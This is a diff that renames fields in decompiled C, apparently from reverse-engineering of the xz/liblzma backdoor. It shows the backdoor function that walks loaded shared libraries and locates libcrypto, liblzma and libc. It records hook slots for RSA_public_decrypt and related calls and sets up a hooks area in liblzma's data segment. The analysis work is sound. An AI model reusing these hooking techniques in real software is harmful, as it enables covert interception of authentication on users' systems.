@@ -45,7 +45,7 @@ BOOL process_shared_libraries_map(link_map *r_map,backdoor_shared_libraries_data
   }
   do {
     if (*(ulong *)(r_map + 0x18) == 0) {
-      shared_maps = data->data;
+      shared_maps = data->shared_maps;
       if (shared_maps->main_map == (link_map *)0x0) {
         return FALSE;
       }
@@ -78,10 +78,10 @@ BOOL process_shared_libraries_map(link_map *r_map,backdoor_shared_libraries_data
     }
     basename_ptr = soname_cursor;
     if (*soname_cursor == '\0') {
-      if (data->data->main_map != (link_map *)0x0) {
+      if (data->shared_maps->main_map != (link_map *)0x0) {
         return FALSE;
       }
-      data->data->main_map = r_map;
+      data->shared_maps->main_map = r_map;
     }
     else {
       while (name_char = *soname_cursor, name_char != '\0') {
@@ -91,7 +91,7 @@ BOOL process_shared_libraries_map(link_map *r_map,backdoor_shared_libraries_data
         }
       }
       basename_id = get_string_id(basename_ptr,soname_cursor);
-      shared_maps = data->data;
+      shared_maps = data->shared_maps;
       if (basename_id == STR_libc_so) {
         if (shared_maps->libc_map != (link_map *)0x0) {
           return FALSE;
@@ -145,17 +145,17 @@ BOOL process_shared_libraries_map(link_map *r_map,backdoor_shared_libraries_data
         shared_maps->dynamic_linker_map = r_map;
       }
     }
-    shared_maps = data->data;
+    shared_maps = data->shared_maps;
     r_map = *(link_map **)(r_map + 0x18);
   } while ((((shared_maps->main_map == (link_map *)0x0) || (shared_maps->libcrypto_map == (link_map *)0x0)) ||
            (shared_maps->dynamic_linker_map == (link_map *)0x0)) ||
           (((shared_maps->libsystemd_map == (link_map *)0x0 || (shared_maps->liblzma_map == (link_map *)0x0))
            || (shared_maps->libc_map == (link_map *)0x0))));
-  rsa_get0_key_slot = (undefined8 *)data->RSA_get0_key_plt;
-  evp_set1_rsa_slot = (undefined8 *)data->EVP_PKEY_set1_RSA_plt;
-  rsa_public_decrypt_slot = (undefined8 *)data->RSA_public_decrypt_plt;
+  rsa_get0_key_slot = data->rsa_get0_key_slot;
+  evp_set1_rsa_slot = data->evp_set1_rsa_slot;
+  rsa_public_decrypt_slot = data->rsa_public_decrypt_slot;
   elf_info = data->elf_handles->main;
-  map_cursor = data->data->main_map;
+  map_cursor = data->shared_maps->main_map;
   if (map_cursor == (link_map *)0x0) {
     return FALSE;
   }
@@ -185,24 +185,24 @@ BOOL process_shared_libraries_map(link_map *r_map,backdoor_shared_libraries_data
     return FALSE;
   }
 LAB_00104924:
-  map_cursor = data->data->libcrypto_map;
+  map_cursor = data->shared_maps->libcrypto_map;
   if ((map_cursor != (link_map *)0x0) &&
      (success = elf_parse(*(Elf64_Ehdr **)map_cursor,data->elf_handles->libcrypto), success != FALSE)) {
-    hooks_data_addr_ptr = data->hooks_data_addr;
+    hooks_data_addr_ptr = data->hooks_data_slot;
     liblzma_data_segment_size = 0;
     elf_info = data->elf_handles->liblzma;
-    map_cursor = data->data->liblzma_map;
+    map_cursor = data->shared_maps->liblzma_map;
     if ((map_cursor != (link_map *)0x0) &&
        (((success = elf_parse(*(Elf64_Ehdr **)map_cursor,elf_info), success != FALSE &&
          ((elf_info->feature_flags & 0x20) != 0)) &&
         (hooks_blob = elf_get_data_segment(elf_info,&liblzma_data_segment_size,TRUE), 0x597 < liblzma_data_segment_size)))) {
       *hooks_data_addr_ptr = (backdoor_hooks_data_t *)((long)hooks_blob + 0x10);
       *(u64 *)((long)hooks_blob + 0x590) = liblzma_data_segment_size - 0x598;
-      map_cursor = data->data->libc_map;
+      map_cursor = data->shared_maps->libc_map;
       if ((map_cursor != (link_map *)0x0) &&
          (success = elf_parse(*(Elf64_Ehdr **)map_cursor,data->elf_handles->libc), success != FALSE)) {
         success = resolve_libc_imports
-                           (data->data->libc_map,data->elf_handles->libc,data->libc_imports);
+                           (data->shared_maps->libc_map,data->elf_handles->libc,data->libc_imports);
         return (uint)(success != FALSE);
       }
     }
